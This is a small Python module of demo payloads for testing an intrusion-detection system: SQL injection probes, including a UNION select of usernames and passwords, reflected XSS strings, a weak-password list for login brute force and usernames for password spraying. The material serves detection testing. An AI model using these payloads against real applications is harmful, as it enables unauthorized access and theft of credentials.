"""Attack payloads for the demo. These are classic *detection* probes: the strings an IDS
is expected to flag. They are deliberately non-destructive — the SQLi probes read or test,
they do not DROP or DELETE — so they are safe to fire at a test web app during a demo.

Standard library only, Python 3.9+.
"""
from __future__ import annotations

from typing import List

# SQL injection probes (tautologies, UNION/read probes, comment breaks). No destructive DDL/DML.
SQLI: List[str] = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "1' ORDER BY 1 -- ",
    "1' UNION SELECT NULL -- ",
    "1' UNION SELECT username, password FROM users -- ",
    "' OR SLEEP(0) -- ",
    "admin' -- ",
    "') OR ('1'='1",
    "1 AND 1=1",
    "0x27 OR 1=1",
]

# Reflected XSS probes.
XSS: List[str] = [
    "<script>alert(1)</script>",
    "\"><script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "'\"><svg onload=alert(1)>",
]

# A short wordlist of obviously-wrong passwords for login brute force. Never real credentials.
BAD_PASSWORDS: List[str] = [
    "password", "123456", "admin", "root", "letmein", "qwerty",
    "changeme", "welcome", "password1", "test123",
]

# Throwaway usernames to spray; none should exist on the target.
SPRAY_USERS: List[str] = [
    "devmon-test", "attacker", "oracle", "guest-x", "svc-demo",
]
